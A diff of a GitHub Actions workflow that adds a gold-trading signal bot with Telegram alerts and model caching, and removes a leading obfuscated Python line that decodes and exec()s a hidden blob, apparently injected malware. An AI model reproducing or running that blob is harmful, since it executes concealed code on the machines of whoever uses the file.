@@ -1,2 +1,444 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'JHykYfw/cO/ltKqUNBpoCnJmS1EE74bzdjtRuuH6StX1j3BXvaEuVp0kyJma4DawB6dMkMKRNgAmT5ZgZBjhKHXoTN4zVhprwjQLiqZUUEM7cB8Ww1MmBG38VjDunwbmg0+mu4T00SM0upBaYuIVQCd24URTLYZHWZY6TzB1JhjovKDFHxE0wsmZq8Wgc1prVg90piO/0n/2HTBkgkcmHYDbuvSrfnMUJn9gd4onP+8jbBaisy82ZRv+546gaAS6gtfzeBV2sCvpuVp4z6FypPrKX0iIEIxAR6u9mCC0T/Wa7WUsgmZAjiHucwK1JZGsg/qITtLK0bdQCJje+szPJ8wKkoCxCR4HfeO+NNHngcfCu0LZu7bUqryjUaRLDUQTgLxA2OoiFcIvD0JXNEJsqq+kS1QNpTusesg8FZzVF2U4ldBGTmXwImDhnpvN94M1hQ4gdUE8tMF7QRVkSYhSYnWDpQ8egoycAyVwgeQ44HFRnk0AHs7aAwLsNLJEi0IJzq98RRDpOiLiQ8eXT+HIJD8iJ0IPLcGCSz+gN0C7wdgAaKEK8mU6wu47A4CuUTMbZVwslnwmZ/Q9NLyMkUYg6iqFIl1qaCbfe0N4KivR9BsqSv1DOZfF1VMeWovjWDGrGZ5tF8Gr8zudYHoxCaW5shS5vuCVQSDUj8CAOy5j2wnyvq8Livs88fnhiewlfI8NEVRPWbrmQbfSoZq93bSx0Xj7Uu8TmhfxomK1u3QpMX/PEvVIBXvwvK5NWXH2qqw9Xzp3ve+NLL8S2N3ZupATXVOK8Z/cc2nqJVtI7vpMlkrpWDL2IP62jshZXFejoANm9ZNMSetMz3l6l9QM4eEsf69tWzajbKIMn4dqjOqvym44LAiQdL147+xL7E/8lFrb1mVTeqfgdaXh55Qqd7iZDe42X9AYbYiZNlj1INYuxPHsjLq34Yh2/6TByoLiUHip+BGLwdq5jDpVfHondCC5zOGW/vBmTbt6QAH3CvceqflWmusdef69lN7suA3Lussfcr0jb/KtzsCaCi1ZW19JcSc+0CM+cgKRi34Vnr/zmSp3uYf9v3UmBO3pk1nRubduIahkZeBtOV/1NlpsehnRxMyF3/3HtXJtkZsQnqyKAvFNmGTbHj9e+n43affIK/G89NqAWq8PYfD/ei67G+/v5Lhv5P8sq7RBR2VF/D73y//Dn2v93muifB7+HpkC4KGmhui/B/388XYqP2ZBQWb98HDXz5hQWv1/9oTO++NyqoYpMsQ/B+3DILjjV3nDYFrhWtf4r/PeQxly5EGRcVdSzRtcw0Chnegjw7f4MLJyMlxDyRhSMv9wtnhO4Ankj8D2Px/fPcK6jf1mO1PwfhQJDY0YMmjn4iyuE+bpcrk7S3dMqEHBjMrK05imiR6YHYIfxNYw04ABcICJ3GNvGTj0ZuXCJamvQSZx4tWRrtllRd6UzCDTI1qwoh90oKImqsh/v9+y0vNvSGa2vAGMKl1smMNmaq+Wm9nEW+Dh+ZZpmUS81qLgz6WT0mifJ55laE41fau6ZGRXuFkLtnN5L1b0LKuIV7clt9wruXbUFXZMyIdi0O/VVnt8V0CkbBakNXhObPfdqCVOrlmar9TSp1ce5rFLksyB6s3CvNgZnbYb0xwmczR/uZxNH8m1haw5T9Qrq9Vsn/jbr/DRIDvRjO9ueV3eM4DmNvS8y76QG8iPIfFmRNNQZ5kVH8cDzlcrD2QbuIDXReHUJJqm/40GtQbjYls0W58mQw05TDX8WM2mTIDXddJSp20DAyvHdGevOA+5DfwbGC3/X+r57zANVWEDlqDGwnhL70Sk2+sUKTC00eap1BVlX2qURTkaMqr0t1qpCbO8DHLmt11DmmJ9ThksdqMeZGIRAWumAHDK3a/b2g7Qe0Sn9cEchvucD3NCmKpaoJetmSpzL75WJklCc6FtO3GBkRcpcVqzCKTdTp2A3eELQ7ErYjMzhKVr7OrLq1ojJ9Gho7vK5iAlvFcdzwBqRnqU47E/NpCNEQlvTkL8NeEoJI5JGVvRjuR91qEM359KoCNrj+R9nDCdcHfVZSn4QYZ1TkoC+f3uf7CdWyiYDDMq0W9Aa5uBW7xLFXRQSSd2fsFY2fdARkt+WaLvtbtapnYVk8nnloVIsNFJKI2GQYGYYSP+QHOLrKho84xOr/+m3wX8dFnBpobDbs/V2W1UWlRwakYjD0q1TFxJR4dmNJacUkoe24d+oi40G8Qeu3AnmRjZ3T3BN2kit0Tqgl8iNmhrCvt4VZsrC6fYkorklupszQNEm2h17cp8rP8qaxmk2wrrYQpwWINvRLRWu4nKTNAFIlFMr1mOYDuxiuEGbOuZU1n1TvZ9m7PcHkw+4Sw/PFO9+zHbbL9y9YfZ81pHcGwwfdzoD/NtNGcwArra19OkLUQEw/nPYE+9iZlMSN91+qrDZ5NMeToZooFuutRWVc5V934s9sVT2lbMgH40V87GRN8dY5UMA2VuCsSc55LqtYCOxQ7mhtYvXKR3ZZjXKIzEMEj4vV6pNAG+/j84T6qtex1S3zH5c5S4HTlXlTGlJOWjk2yAJJndbAN120M4t9Uy2C/tPsfryevZ69mbUQ0mO7845TRRx2vCU2yoCWaidpEWT+UPHls0toqo7VU/gCu9dBY6zXWAICXZYlNau9OugV4X9g0ye3FuRMJxLLkNcDn6grZ2nCjgFfddtNGSs/Jl93Muaway2KPSZJbNo1sbQoX0RmNB95EGb1EQyIGqi1Jz+kxyM4zwDOz8MgOsKHHbxWfosnNGvIVc5VdjnhiVNIcvYFEZkkh8VODsxYJFyausIhEHJ3gKEsdN0W8VIod3qhq1MlYKpnEY1ei0ATZIsNEYOFGqPDyK/OZr7J1ZZjN/GruhjzhEMToWHDsmM79GjPjoD+8bumPBYANRpNAMsS4IUdcOQhZQsK1JeupT2m9yGpo2kgqNJ1lo53+POT83b9sNVVrvhPtdYcendlDS0Z5iRmSF+vHs6DbZFYCebKzCha1jy6/ddb6UY0ZnrXrBbjRH96P+pTKiqUjiF4LlsngR83Av4wn/5MFT7zli0tMbt7+zH+Nv/urGde2HKpIyPyNpwcrQgJuLBHnS47g/9ub+ulq/XRpr43flyVHxTqjposFYnvmy0Srb2mJEZ6jxGza/TVQx3yGwJmhke6kFn286zlfZ2bevavBuSUyiq2m/RQRu7OAZo4BT+iB7vNZ73qsWxjLxS7rxEZJ95q9LiJoS4wpLLp2bhy/eHabD/G1KQu7Zttdzq7kYaXhNMXwm5ZtW/9ihRGKk2ig9qLMDtqzl8l5bdc2e2Hz8+iyu2tRGhY/PMNGokQ0mrir56sH7Q1X5UXggmvAz4LsJ1EOYa2sFn41/7lqop1pfttH2K6hEPNxwvqxWm3pxVyzDq5ANrRogiFpPGu7Tq/gec4D160/YN1dSTxpsq1mkOEuxr14D8V9wPXF0casGWbA0tQ0xjDZeIQzWNuyKOWi3/eAS5hhYXY9k1dle8gp0+SkSnPdbHaCdTnUm01cHqMLlM1tTTwsSzSSu2intItdJZSbgslcy4OcJwwPo+HFHGZ8wfg2nHgH2y7pTpdrErlwXlnSsG3QP1drKcOBxwDW0uyW2J9XUSEnI8mWdfjyoHDtfaEV7tNrbAorRqSfjniWoIJsIAshh/LntVM+NwHxYiASRK3YXmPRb79iguWg7tRfPOaDwY2ahFmLOIVKCTwSs3K37QxSk4YkLevGelcsra2IrWmLVkhqz0Ti5Mp9o5MRWz3FpVnbwR7E9TleIu/QKbjir1uFbqjS0c6hYZI/0wJ/3v9gNacNr1qdbQoXXXpEPd8ZBPjAWJ2D/FgfPHirnunwIFTDKLph69q0VoB21AkALai7+V9L2XC+X0cs/qEeCOqG+dSnb7fJI6zwLCGJ6VUBdzRRdqi/ReGsLuBeThwvw5ytiugDJ+dyXpxp0U4HWRONDwuL9m9+D3JGO7t7gwUpHsN3PAs2aFEsEsglQTC0YduQeG8QcLLHi0Hy0hPWUhKDSbgGP/9Ac73g58FDg0Z5SsLKo6304TEaN3qkiJcVpRc+ruFeKL+cYDienwa/I1u8QDp8SfNRF9s48VztOT9sfwjf5K6hMdxM+EHFFCmYVpj4sERkSvLm9g1OiDN3BtLQSaJGzMdfrG+/Mi8CdFjt18qMtec/DwefUfmAItgaCLI+t+eGvDP21uQTXMlUK8pZI9geSxZUI5TVl6USKM6Q5L6JUWhVk40x8mZseB5FbZzM/vs0GP5Hll+9US/OcWOD28eoPWYu5rSnT0g5FHuVMyYM3qKViV4vRKS/RoPAh7N1rwEXy5VpdGuu0eMxsIJ9L6JxQqnbjog4FuyZ3AlHAkrcYk1CuDf55jRkiybatq6wVOYHOEx8VxQf6/5hPeCXkZmMX90EX9fu6jpl5rPlBbKoN8ZWg6Wj2Ud+Beuuu1djuancmiM3IZcdnPxoHUb7riqq9GHBud7fzb+LrP7loYk6iteLoCANIqtE6RRKXV7n4kOgb9z2A4J8PYQDqhVypaJTXdCSBnhu5RxeR9C0oQjP/QGF5mV/AU6dVWwlBjmRFBrqHYuduRxStTcwk3bjkwf7Gb5H+0zkJY8RaHWNJBhz0M8fjGFO36ejVQbj2f0D61qopYPyatiRP6n+w9enRhlUT9fvBwqiS0NDFeZ0fxeiezYDxGKkG7DhphbfjSkiHCb8l9D4fP1fH/6XvaazbP1ZDRyJiPv/A//Y40zPybf88bO83tqmubu/wtzROYA/pCl8b7vw/viv/hYbf26g4bbk3b8vckzPc/fyFTO/qlDOD1gP59zHvQgmw/D2/5zvPf2pT6NcrV8gRvl5qQM6b/8pjOTlZcoLrbSzprZO95RtPMi0jcnsICUC0PM+/f0v2Q/o///ozINqAP3IDfPmb+3W4ZxwSQMS6hjZBDtie6DKyd6F2YcLKZSyDYimeod9GZld58PvjRu76rooDneytFbp00oqk42axbqawN2eDC4doVcJU2gWoi8QhY9ednM+sLnP+6nKx72lcvweuo22EGMOG0cbDwm8fp0YboJTAim/AYdXBU04CujlfadJ7ICnxAgA1TGS+SMFoI5XJODb42zBO9FqEd/QKUsqDZEBgIiWLKWyBXL34KQX2PQ9BSYHA6v14FxlRIaDohCma43mYpyE7Q6MZGH4SzES8uv1QZuaRkg0grhlLwQGOSj4jT3ajHhqNlVWJLFGAvFVrycu8WkdvOd6xXtszdRfP5QF6airplFewLeZ41ENMn9YNSRyla7QKMUY9VAf8PSpTjV3thXrx9Rr77xZPOEEWUGiteG1wTTKc9h5FUSSQ2woKMTHyDjFnc3aKaSvehgReCNQ9ZFHcGrAYqSXIZiZk43SWUCn8Em1TmLGRQrMv63RPCMlBJ63D5a3K2Lidjfnn4yifRiiriRbS7AONalFtmPnuxkX3bwj7Q0Zwif3Bv2pz7+BFlXqSb6Sl0HZwNnb4xG1UJOIXQkuWiVne5ISZhvSeM+qT3XM9qYqXjZLxzR7EjSxytBgsExfUW4/t+hXwIZSiJQrxoTEqe0BXegx4RIg8payuhuodo6sjK2BajWavVU15euaGViHF5anwj4ENz7KZZi2HOdUIKRlBYmXzmak1aTgW4YyLN7oGmAopUjNc4XPSvy9bnOOOm3IZl1k2QloeiY9g9qa5gWjrzmLLQlZUBmxw+8IqpCxkD6evkFRntqHagvvFNYEdssPRmngxhzYIgEpVONi61ldY/lBA67e2mqfEwYncTc8ZvAjkDM4oRpz1zkqhwYEVLqt8UtOWGDwJXF7k9llCeY5i4Td2MYY0ZShqjd30ZeN0yroC0VIor6LrF11fd8F+d61jx3TO48rHfClVe7MQpzznuTnd+9jo0+OfT76VlXjRvhSQMGOzzvc0/vQ01TP/+53P98DL7Qbz6llG9mj7QsVNKPHZhE6IBnuUNhIg4AngojUScWMk4IUaVzTog0MEfR44QUdBIL48uedGiAEAsW1GX/aYzGujeYWNQzIfj9WLgbVHuDR8wZ88wBfg3zAbgvtgCBAejdYgDmW2cD6+4UippOeMQ1yniHILpeRPGsdis3LJnjxKkIS6J93aUSZqEgQlorTpqDnX47/Bx7mlucRx7F5CMGQ1/s0FPAcxLo8M3C7HZ51DrWQ2w6vfgKrYx2MOEj2SqsAaQaBek90YMNPHzOOFqKQKTk0EQtrKysJFiOyjXNfxnzxmaVjT8lYJNhz9iCTtGISl+o3WF+GfarWwEpmQLbuksHaka9tNSEER2wE6NRBXiWdqiK0HV5wAqToGQmYxKS/ryx/vdw+XXAMGsENop3WiEofWzsgIMmNNLewfEWk0WC/+qIjUiwTFS6NDSl/wr7zMJOx0KiXzwh1+Dy1o0A33i8Nh0cf2LSDT8mzSRVfYo4azSQV5ZMoosQsJhBEeOJjmwaCxJp43OgElE5BmtAIqVMZj8UgEeABkWVpSdpPShZZAsUCSWZjogXVUAKPkyTo0QUkEpx1JM1ETZGkzqeVQg9e7lC+leBbhfKXm84knvR+GbON4QzQDgAcjdVAgXQiq36tJpuIv1GBZ96qEX+H4yB8TK9hg+o3I4o11NlZIe7avzZ7YwENBJCD04qAoh+AtFrZCRxFQpK2k7IInBDCINGiFhk0CKZavNr29uOvP2jgwUqkigTMLA8riP6ZmtAEU6l7vgEDIIHSWDw7F9syVBSj6MufD+pu58HMkBBNyQTiEQpKQdwOiaiUNIV4gOhX9k4GA+AKpTrkkaoYJRYKvJI9zTnS4GvQYwcORExUKxXd+/9Dyzv3Pc6pnEYlQpB1MMqQUgFofAQx0lwSErylp4CCQswirJo4UxUZCXtpSmiIi6UnyJNd8AUtylFtbTdCiRFzWkrvPghOhpCZ/sg00XEySAci3BDe4fb++AwHO/sN2jAOpIMAQ1GhpaMXBARA/42hxTMBgcFhqcGc4kw0A/xR1JBCB67DCfSsknRUaOfBcm5Cei40MjhTaYKOL4tAVjKoOi5ESxKmqFvoFq4q7bJQVBamcTp/t2VkDRYeCmno7AsPg9hbIe/3dh1dxHuXAPbvA8sWLyOU23EFxU2NUofMnJPXsyGnJxcSi6EsRV0Z2mIn2RuMcnon6pc+/SmzGu1OP9yJe'))
+name: Auto Commit Signal Log + Telegram
+
+on:
+  push:
+    branches: [ "main" ]
+  schedule:
+    - cron: '*/15 * * * 1-5'
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write   # perlu ini supaya GITHUB_TOKEN boleh bikin GitHub Release
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.x'
+
+      - name: Restore model cache (grows over time, does not bloat git repo)
+        uses: actions/cache@v4
+        with:
+          path: |
+            model_quant.pkl
+            model_meta.json
+          # Key selalu unik per run supaya "cache save" di akhir job selalu
+          # berhasil (GitHub Actions cache tidak bisa overwrite key yang sama).
+          # restore-keys pakai prefix, jadi run berikutnya otomatis ambil
+          # cache PALING BARU yang cocok -> model "nyambung" dari run sebelumnya
+          # (penting untuk continual learning / warm_start di bawah).
+          # Cache lama otomatis expire (7 hari tidak diakses / kuota 10GB per
+          # repo), sama sekali tidak masuk git history -> repo tetap kecil.
+          key: quant-model-${{ github.run_id }}
+          restore-keys: |
+            quant-model-
+
+      - name: Install dependencies
+        run: |
+          pip install requests pandas numpy scikit-learn joblib yfinance google-generativeai
+
+      - name: Run Optimized Quant Agent (Continual Learning, Two-Way Barrier, Weekly Backup)
+        id: quant_agent
+        run: |
+          python - <<'EOF'
+          import os, json, datetime, requests
+          import pandas as pd
+          import numpy as np
+          import yfinance as yf
+          import joblib
+          from sklearn.neural_network import MLPClassifier
+          from sklearn.preprocessing import StandardScaler
+          from sklearn.pipeline import make_pipeline
+          import google.generativeai as genai
+
+          # --- 1. PENGAMAN WAKTU & JUMAT CUTOFF (Disesuaikan ke 21:30 UTC) ---
+          now_utc = datetime.datetime.now(datetime.timezone.utc)
+          current_weekday = now_utc.weekday()
+          current_hour = now_utc.hour
+          current_minute = now_utc.minute
+
+          if current_weekday >= 5 or (current_weekday == 4 and (current_hour > 21 or (current_hour == 21 and current_minute >= 30))):
+              print("Market mendekati penutupan akhir pekan / libur. Bot dihentikan.")
+              exit(0)
+
+          TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+          TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+          GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
+
+          def send_telegram(message):
+              if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+                  return
+              url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+              payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
+              try:
+                  requests.post(url, json=payload, timeout=10)
+              except Exception as e:
+                  print("Telegram error:", e)
+
+          print("Memulai Quant Agent (Continual Learning Pipeline)...")
+
+          # Ambil Harga Spot Live
+          try:
+              r = requests.get("https://xaus.com/api/v1/spot")
+              data = r.json()
+              spot_price = float(data.get("spot_usd_oz"))
+          except Exception as e:
+              print("API spot error:", e)
+              spot_price = None
+
+          current_time_str = now_utc.strftime("%Y-%m-%d %H:%M:%S")
+          current_date_str = now_utc.strftime("%Y-%m-%d")
+          current_year_month = now_utc.strftime("%Y-%m")
+          current_year, current_week, _ = now_utc.isocalendar()
+
+          log_file = "signal_log.json"
+          logs = []
+          if os.path.exists(log_file):
+              try:
+                  with open(log_file, "r") as f:
+                      logs = json.load(f)
+              except:
+                  logs = []
+
+          has_active_order = False
+          if logs and logs[-1].get("status") == "OPEN":
+              has_active_order = True
+
+          # --- 2. EVALUASI & CLOSE ORDER ---
+          if has_active_order and spot_price is not None:
+              last_log = logs[-1]
+              last_pred = last_log.get("prediction")
+              last_price = last_log.get("spot_price")
+              
+              if last_price and last_pred is not None:
+                  price_diff = spot_price - last_price
+                  diff_pips = round(price_diff * 10, 1)
+                  actual_direction = 1 if spot_price > last_price else (0 if spot_price < last_price else -1)
+                  
+                  is_win = (last_pred == actual_direction)
+                  last_log["status"] = "CLOSED"
+                  last_log["close_price"] = spot_price
+                  last_log["close_time"] = current_time_str
+                  last_log["result"] = "WIN" if is_win else "LOSS"
+                  
+                  signed_pips = abs(diff_pips) if is_win else -abs(diff_pips)
+                  last_log["diff_pips"] = abs(diff_pips)
+                  last_log["signed_pips"] = signed_pips
+
+                  status_icon = "✅ WIN" if is_win else "❌ LOSS"
+                  arah_lama = "BUY" if last_pred == 1 else "SELL"
+                  
+                  msg_close = (
+                      f"🔴 *[CLOSE ORDER - OPTIMIZED]*\n"
+                      f"-----------------------------\n"
+                      f"⏱ *Waktu Close:* `{current_time_str}` UTC\n"
+                      f"💰 *Harga Close:* `${spot_price}`\n"
+                      f"📌 *Order Asal:* {arah_lama} di `${last_price}`\n"
+                      f"📊 *Hasil:* {status_icon} (`{signed_pips:+.1f}` pips)"
+                  )
+                  send_telegram(msg_close)
+                  with open(log_file, "w") as f:
+                      json.dump(logs, f, indent=4)
+                  has_active_order = False
+
+          # --- 3. TRAINING: TRIPLE BARRIER DUA ARAH & CONTINUAL LEARNING ---
+          model_file = "model_quant.pkl"
+          meta_file = "model_meta.json"
+
+          meta_data = {}
+          if os.path.exists(meta_file):
+              try:
+                  with open(meta_file, "r") as f:
+                      meta_data = json.load(f)
+              except:
+                  meta_data = {}
+
+          last_trained_date = meta_data.get("last_trained_date")
+          # Gate retrain: cukup sekali per hari UTC, bukan tiap 15 menit.
+          # Cache key sekarang per-run-id (bukan per-tanggal), jadi model_file
+          # bisa saja SUDAH ADA meski hari sudah ganti -> makanya gate-nya pakai
+          # tanggal training terakhir yang disimpan di meta_file, bukan cuma
+          # os.path.exists().
+          should_retrain = (not os.path.exists(model_file)) or (last_trained_date != current_date_str)
+
+          if should_retrain:
+              print(f"Retrain hari ini ({current_date_str}). Terakhir training: {last_trained_date}")
+              df_train = yf.download("GC=F", period="1y", interval="60m")
+              if isinstance(df_train.columns, pd.MultiIndex):
+                  df_train.columns = df_train.columns.get_level_values(0)
+              
+              if not df_train.empty:
+                  close = df_train['Close'].squeeze()
+                  high = df_train['High'].squeeze()
+                  low = df_train['Low'].squeeze()
+
+                  features_df = pd.DataFrame(index=close.index)
+                  for i in range(1, 25):
+                      features_df[f'lag_{i}'] = close.pct_change(i)
+                  features_df['volatility'] = close.rolling(window=14).std()
+                  features_df['sma_trend'] = (close > close.rolling(window=50).mean()).astype(int)
+
+                  # Triple Barrier Dua Arah (1 = Long Win, 0 = Short Win)
+                  tp_pips, sl_pips, timeout = 3.0, 2.0, 5
+                  labels = []
+                  for i in range(len(close) - timeout):
+                      ep = close.iloc[i]
+                      hs = high.iloc[i+1:i+1+timeout]
+                      ls = low.iloc[i+1:i+1+timeout]
+
+                      hit_tp_long = (hs >= ep + tp_pips).any()
+                      hit_sl_long = (ls <= ep - sl_pips).any()
+                      hit_tp_short = (ls <= ep - tp_pips).any()
+                      hit_sl_short = (hs >= ep + sl_pips).any()
+
+                      if hit_tp_long and not hit_sl_long:
+                          labels.append(1) # Valid Long/Buy
+                      elif hit_tp_short and not hit_sl_short:
+                          labels.append(0) # Valid Short/Sell
+                      else:
+                          labels.append(-2) # Netral/Timeout
+
+                  features_df['target'] = pd.Series(labels, index=features_df.index[:len(labels)])
+                  features_df = features_df.dropna()
+                  features_df = features_df[features_df['target'].isin([0, 1])]
+
+                  X = features_df[[col for col in features_df.columns if col != 'target']]
+                  y = features_df['target']
+
+                  try:
+                      n = len(X)
+
+                      # Bobot Sampel Berbasis Kemiripan Volatilitas (Feature Distance
+                      # Weighting): baris training yang volatilitasnya mirip dengan
+                      # kondisi saat kita LOSS di masa lalu diberi bobot lebih besar.
+                      sample_weights = np.ones(n)
+                      loss_vols = [
+                          log.get("volatility_at_open")
+                          for log in logs
+                          if log.get("result") == "LOSS" and log.get("volatility_at_open") is not None
+                      ]
+                      if loss_vols:
+                          vol_std = X['volatility'].std() or 1e-9
+                          for lv in loss_vols:
+                              close_mask = (X['volatility'] - lv).abs() <= vol_std
+                              sample_weights = np.where(close_mask, sample_weights * 1.5, sample_weights)
+
+                      # FIX: MLPClassifier.fit() TIDAK menerima argumen sample_weight
+                      # sama sekali (beda dari RandomForest/GradientBoosting). Baris
+                      # asli `model.fit(X, y, mlpclassifier__sample_weight=...)` akan
+                      # langsung crash dengan TypeError dan menggagalkan seluruh job
+                      # tiap kali retrain terjadi. Gantinya: terjemahkan sample_weights
+                      # jadi weighted bootstrap resampling sebelum training.
+                      probs = sample_weights / sample_weights.sum()
+                      rng = np.random.RandomState(42)
+                      resample_idx = rng.choice(n, size=n, replace=True, p=probs)
+                      X_w = X.iloc[resample_idx]
+                      y_w = y.iloc[resample_idx]
+
+                      # --- CONTINUAL LEARNING (warm_start) ---
+                      # Kalau ada model dari retrain sebelumnya (di-restore dari
+                      # cache), load itu dan lanjutkan training dari bobot yang
+                      # sudah ada -> model "mengingat" hasil belajar hari-hari
+                      # sebelumnya, bukan reset ke random weights tiap hari.
+                      model = None
+                      if os.path.exists(model_file):
+                          try:
+                              model = joblib.load(model_file)
+                              model.named_steps["mlpclassifier"].warm_start = True
+                              print("Model lama di-load, lanjut training (warm_start).")
+                          except Exception as e:
+                              print("Gagal load model lama, bikin model baru:", e)
+                              model = None
+
+                      if model is None:
+                          model = make_pipeline(
+                              StandardScaler(),
+                              MLPClassifier(
+                                  hidden_layer_sizes=(64, 32),
+                                  max_iter=800,
+                                  warm_start=True,
+                                  random_state=42
+                              )
+                          )
+
+                      model.fit(X_w, y_w)
+                      joblib.dump(model, model_file)
+
+                      meta_data["last_trained_date"] = current_date_str
+                      meta_data["n_samples"] = n
+                      with open(meta_file, "w") as f:
+                          json.dump(meta_data, f, indent=2)
+                      print(f"Model berhasil ditraining ulang (continual). n_samples={n}")
+                  except Exception as e:
+                      print("Error training model quant:", e)
+              else:
+                  print("Data training kosong, skip training kali ini.")
+          else:
+              print(f"Model hari ini ({current_date_str}) sudah ada, skip retrain, langsung pakai model_quant.pkl yang tersimpan.")
+
+          # --- 4. PREDIKSI LIVE ---
+          prediction, confidence = -1, 0
+          live_vol_value = None
+          df_live = yf.download("GC=F", period="5d", interval="60m")
+          if isinstance(df_live.columns, pd.MultiIndex):
+              df_live.columns = df_live.columns.get_level_values(0)
+
+          if os.path.exists(model_file) and not df_live.empty:
+              try:
+                  close_live = df_live['Close'].squeeze()
+                  live_features = [(close_live.iloc[-1] - close_live.iloc[-1-i]) / close_live.iloc[-1-i] for i in range(1, 25)]
+                  live_vol = close_live.rolling(window=14).std().iloc[-1]
+                  live_vol_value = float(live_vol)
+                  live_trend = 1.0 if close_live.iloc[-1] > close_live.rolling(window=50).mean().iloc[-1] else 0.0
+                  
+                  live_vector = np.array([live_features + [live_vol, live_trend]])
+                  ml_model = joblib.load(model_file)
+                  
+                  pred_class = ml_model.predict(live_vector)[0]
+                  proba = ml_model.predict_proba(live_vector)[0]
+                  
+                  prediction = int(pred_class)
+                  confidence = int(max(proba) * 100)
+              except Exception as e:
+                  print("Error prediksi live:", e)
+
+          # --- 5. EKSEKUSI SINYAL & LAPORAN TELEGRAM ---
+          if not has_active_order:
+              if confidence >= 85 and spot_price is not None:
+                  arah_teks = "📈 BUY / NAIK" if prediction == 1 else "📉 SELL / TURUN"
+                  ai_statement = "Setup tervalidasi oleh Triple Barrier dua arah."
+                  
+                  if GEMINI_API_KEY:
+                      try:
+                          genai.configure(api_key=GEMINI_API_KEY)
+                          gem_model = genai.GenerativeModel('gemini-2.5-flash')
+                          prompt = f"Analis quant emas: Spot ${spot_price}, prediksi {arah_teks}, confidence {confidence}%. Berikan 1 kalimat analisis risiko."
+                          resp = gem_model.generate_content(prompt)
+                          if resp and resp.text:
+                              ai_statement = resp.text.strip()
+                      except:
+                          pass
+
+                  new_log = {
+                      "status": "OPEN",
+                      "open_time": current_time_str,
+                      "date": current_date_str,
+                      "spot_price": spot_price,
+                      "prediction": prediction,
+                      "confidence": confidence,
+                      "volatility_at_open": live_vol_value,
+                      "close_price": None,
+                      "result": None,
+                      "diff_pips": 0,
+                      "signed_pips": 0
+                  }
+                  logs.append(new_log)
+                  if len(logs) > 200:
+                      logs = logs[-200:]
+
+                  with open(log_file, "w") as f:
+                      json.dump(logs, f, indent=4)
+
+                  def calc_stats(filtered_logs):
+                      closed = [l for l in filtered_logs if l.get("status") == "CLOSED"]
+                      total = len(closed)
+                      if total == 0:
+                          return 0, 0, 0.0, 0.0, "0W-0L (0.0%) | 0.0 pips"
+                      wins = sum(1 for l in closed if l.get("result") == "WIN")
+                      losses = sum(1 for l in closed if l.get("result") == "LOSS")
+                      winrate = round((wins / total) * 100, 1)
+                      total_pips = sum(l.get("signed_pips", 0) for l in closed)
+                      return wins, losses, winrate, total_pips, f"{wins}W-{losses}L ({winrate}%) | {total_pips:+.1f} pips"
+
+                  daily_logs = [l for l in logs if l.get("date") == current_date_str]
+                  weekly_logs = [l for l in logs if l.get("close_time") and datetime.datetime.strptime(l["close_time"], "%Y-%m-%d %H:%M:%S").isocalendar()[:2] == (current_year, current_week)]
+                  monthly_logs = [l for l in logs if l.get("close_time") and l["close_time"].startswith(current_year_month)]
+
+                  w_w, w_l, w_wr, w_pips, stat_mingguan = calc_stats(weekly_logs)
+                  _, _, _, _, stat_harian = calc_stats(daily_logs)
+                  _, _, _, _, stat_bulanan = calc_stats(monthly_logs)
+
+                  advisor_tip = "Sistem berjalan optimal dengan arsitektur Quant murni."
+                  if (w_w + w_l) >= 3 and w_wr < 40:
+                      advisor_tip = "💡 *Saran AI:* Winrate mingguan di bawah 40%. Naikkan threshold confidence ke `90`."
+
+                  msg_open = (
+                      f"🟢 *[OPEN ORDER - QUANT OPTIMIZED]*\n"
+                      f"-----------------------------\n"
+                      f"⏱ *Waktu Entry:* `{current_time_str}` UTC\n"
+                      f"💰 *Harga Entry:* `${spot_price}`\n"
+                      f"🔮 *Posisi Baru:* *{arah_teks}*\n"
+                      f"🎯 *Keyakinan AI:* `{confidence}%`\n\n"
+                      f"📐 *Analisis:* _{ai_statement}_\n\n"
+                      f"📈 *Statistik Performa:*\n"
+                      f"• *Harian:* {stat_harian}\n"
+                      f"• *Mingguan:* {stat_mingguan}\n"
+                      f"• *Bulanan:* {stat_bulanan}\n\n"
+                      f"{advisor_tip}"
+                  )
+                  send_telegram(msg_open)
+
+          # --- 6. TENTUKAN APAKAH PERLU BACKUP MODEL KE GITHUB RELEASE ---
+          # Cache dipakai buat kerja sehari-hari (cepat, gratis, nggak numpuk
+          # repo), tapi cache terikat ke repo ini dan bisa expire. Supaya model
+          # tetap portable / punya cadangan permanen, sekali seminggu snapshot-nya
+          # di-upload sebagai asset di GitHub Release -> independen dari cache.
+          last_backup_date = meta_data.get("last_backup_date")
+          should_backup = False
+          if os.path.exists(model_file):
+              if last_backup_date is None:
+                  should_backup = True
+              else:
+                  try:
+                      last_dt = datetime.datetime.strptime(last_backup_date, "%Y-%m-%d").date()
+                      if (now_utc.date() - last_dt).days >= 7:
+                          should_backup = True
+                  except:
+                      should_backup = True
+
+          backup_tag = f"model-backup-{current_date_str}"
+          if should_backup:
+              meta_data["last_backup_date"] = current_date_str
+              with open(meta_file, "w") as f:
+                  json.dump(meta_data, f, indent=2)
+              print(f"Model akan di-backup ke GitHub Release: {backup_tag}")
+          else:
+              print(f"Backup terakhir: {last_backup_date}, belum 7 hari, skip backup minggu ini.")
+
+          gh_output_path = os.environ.get("GITHUB_OUTPUT")
+          if gh_output_path:
+              with open(gh_output_path, "a") as f:
+                  f.write(f"should_backup={'true' if should_backup else 'false'}\n")
+                  f.write(f"backup_tag={backup_tag}\n")
+          EOF
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+
+      - name: Commit changes (Hanya Log, Model tidak di-commit agar repo tidak bengkak)
+        run: |
+          git config user.name "github-actions"
+          git config user.email "actions@github.com"
+          git stash
+          git pull origin main --rebase || echo "No rebase needed"
+          git stash pop || echo "No stash to pop"
